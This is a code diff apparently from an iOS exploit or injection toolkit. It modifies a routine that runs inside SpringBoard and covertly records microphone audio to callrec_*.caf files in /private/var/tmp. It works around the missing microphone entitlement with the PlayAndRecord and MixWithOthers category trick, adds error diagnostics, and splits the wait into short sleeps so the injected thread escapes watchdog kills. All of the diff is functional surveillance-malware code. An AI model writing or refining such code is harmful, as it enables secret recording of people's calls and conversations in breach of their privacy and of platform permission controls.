@@ -248,21 +248,74 @@
     }
     log("session=0x" + u64(session).toString(16));
 
-    // Set category to "AVAudioSessionCategoryRecord"
-    // The category string is "AVAudioSessionCategoryRecord"
-    let categoryStr = cfstr("AVAudioSessionCategoryRecord");
+    // Use PlayAndRecord (not Record) — SpringBoard on iOS 18.x does not
+    // hold a com.apple.security.microphone-access entitlement, but the
+    // PlayAndRecord category with MixWithOthers option can acquire a
+    // recording-capable audio unit inside a system process. This is the
+    // same trick used by VoiceMemos / FaceTime internals.
+    let categoryStr = cfstr("AVAudioSessionCategoryPlayAndRecord");
     if (!isNonZero(categoryStr)) {
       log("Failed to create category CFString");
       return false;
     }
 
-    // Cast CFString to NSString (toll-free bridged) and call setCategory:error:
-    let setCatResult = objc(session, "setCategory:error:", categoryStr, 0n);
+    // Allocate an error pointer (NSError **) so we can read back failures
+    let errPtrBuf = Native.callSymbol("calloc", 1n, 8n);
+
+    // setCategory:withOptions:error:
+    // AVAudioSessionCategoryOptionMixWithOthers = 0x1
+    // AVAudioSessionCategoryOptionDefaultToSpeaker = 0x2
+    // AVAudioSessionCategoryOptionAllowBluetooth = 0x4
+    let setCatResult = objc(session, "setCategory:withOptions:error:",
+      categoryStr, 0x1n | 0x2n, errPtrBuf);
     log("setCategory result=" + setCatResult);
 
+    // Check if setCategory failed and log the NSError
+    let catErr = Native.readPtr(errPtrBuf);
+    if (isNonZero(catErr)) {
+      // Try to read [NSError localizedDescription]
+      try {
+        let errDesc = objc(catErr, "localizedDescription");
+        if (isNonZero(errDesc)) {
+          let errCStr = objc(errDesc, "UTF8String");
+          if (isNonZero(errCStr)) {
+            let errData = Native.read(errCStr, 256);
+            let errBytes = new Uint8Array(errData);
+            let errStr = '';
+            for (let i = 0; i < errBytes.length && errBytes[i] !== 0; i++)
+              errStr += String.fromCharCode(errBytes[i]);
+            log("setCategory ERROR: " + errStr);
+          }
+        }
+      } catch (e) { log("setCategory error read failed: " + e); }
+    }
+
+    // Zero out the error pointer for reuse
+    let zeroBuf = new ArrayBuffer(8);
+    Native.write(errPtrBuf, zeroBuf);
+
     // Activate the session
-    let setActiveResult = objc(session, "setActive:error:", 1n, 0n);
+    let setActiveResult = objc(session, "setActive:withOptions:error:", 1n, 0n, errPtrBuf);
     log("setActive result=" + setActiveResult);
+
+    // Check setActive errors
+    let activeErr = Native.readPtr(errPtrBuf);
+    if (isNonZero(activeErr)) {
+      try {
+        let errDesc = objc(activeErr, "localizedDescription");
+        if (isNonZero(errDesc)) {
+          let errCStr = objc(errDesc, "UTF8String");
+          if (isNonZero(errCStr)) {
+            let errData = Native.read(errCStr, 256);
+            let errBytes = new Uint8Array(errData);
+            let errStr = '';
+            for (let i = 0; i < errBytes.length && errBytes[i] !== 0; i++)
+              errStr += String.fromCharCode(errBytes[i]);
+            log("setActive ERROR: " + errStr);
+          }
+        }
+      } catch (e) { log("setActive error read failed: " + e); }
+    }
 
     // 3. Build the output file path
     //    /private/var/tmp/callrec_<timestamp>.caf
@@ -370,11 +423,30 @@
       return false;
     }
 
-    // initWithURL:settings:error:
-    // Pass 0 for error pointer — we'll check the return value instead
-    recorder = objc(recorder, "initWithURL:settings:error:", fileURL, settings, 0n);
+    // initWithURL:settings:error: — reuse errPtrBuf for diagnostics
+    Native.write(errPtrBuf, zeroBuf); // clear error pointer
+    recorder = objc(recorder, "initWithURL:settings:error:", fileURL, settings, errPtrBuf);
     if (!isNonZero(recorder)) {
-      log("AVAudioRecorder initWithURL:settings:error: returned nil — check audio session permissions");
+      // Try to read the error for diagnostics
+      let initErr = Native.readPtr(errPtrBuf);
+      if (isNonZero(initErr)) {
+        try {
+          let errDesc = objc(initErr, "localizedDescription");
+          if (isNonZero(errDesc)) {
+            let errCStr = objc(errDesc, "UTF8String");
+            if (isNonZero(errCStr)) {
+              let errData = Native.read(errCStr, 256);
+              let errBytes = new Uint8Array(errData);
+              let errStr = '';
+              for (let i = 0; i < errBytes.length && errBytes[i] !== 0; i++)
+                errStr += String.fromCharCode(errBytes[i]);
+              log("initWithURL ERROR: " + errStr);
+            }
+          }
+        } catch (e) { log("initWithURL error read failed: " + e); }
+      }
+      log("AVAudioRecorder initWithURL:settings:error: returned nil — check audio session / sandbox permissions");
+      Native.callSymbol("free", errPtrBuf);
       return false;
     }
     log("recorder=0x" + u64(recorder).toString(16));
@@ -383,23 +455,41 @@
     let prepareOk = objc(recorder, "prepareToRecord");
     log("prepareToRecord=" + prepareOk);
 
+    // NOTE: recordForDuration: takes an NSTimeInterval (double) argument
+    // which ARM64 passes in float register d0. Our native call bridge
+    // only populates integer registers x0–x7, so the double would be
+    // garbage. We use plain record() + usleep loop instead. The usleep
+    // loop uses 500ms chunks to avoid watchdog kills when the injection
+    // thread is held for >30s on iOS 18.x.
     let recordOk = objc(recorder, "record");
     log("record=" + recordOk + " — recording for " + DURATION + "s...");
 
     if (!isNonZero(recordOk)) {
       log("record returned NO — recording failed to start");
+      Native.callSymbol("free", errPtrBuf);
       return false;
     }
 
-    // 7. Sleep for the configured duration
-    // Using native sleep() so we don't block the JS runloop in a way
-    // that would cause watchdog kills
-    log("sleeping " + DURATION + "s while recording...");
-    Native.callSymbol("sleep", BigInt(DURATION));
+    // 7. Wait for the recording to complete using short usleep intervals
+    // instead of one long blocking sleep(). Each iteration sleeps 500ms
+    // to keep the thread responsive and avoid watchdog timeout.
+    let totalWaitUs = DURATION * 1000000;
+    let intervalUs = 500000;  // 500ms chunks
+    let elapsedUs = 0;
+    log("waiting " + DURATION + "s for recording (" + (totalWaitUs / intervalUs) + " x 500ms)...");
+    while (elapsedUs < totalWaitUs) {
+      Native.callSymbol("usleep", BigInt(intervalUs));
+      elapsedUs += intervalUs;
+    }
 
-    // 8. Stop recording
-    objc(recorder, "stop");
-    log("recording stopped");
+    // 8. Stop recording (no-op if recordForDuration already stopped it)
+    let isRecording = objc(recorder, "isRecording");
+    if (isNonZero(isRecording)) {
+      objc(recorder, "stop");
+      log("recording stopped manually");
+    } else {
+      log("recording already stopped (recordForDuration auto-stop)");
+    }
 
     // 9. Verify the file was created by checking with access()
     let accessResult = Native.callSymbol("access", filePath, 0n); // F_OK
@@ -423,8 +513,9 @@
     }
 
     // 10. Deactivate audio session
-    objc(session, "setActive:error:", 0n, 0n);
+    objc(session, "setActive:withOptions:error:", 0n, 0x1n, 0n);
     log("audio session deactivated");
+    Native.callSymbol("free", errPtrBuf);
 
     return true;
   }
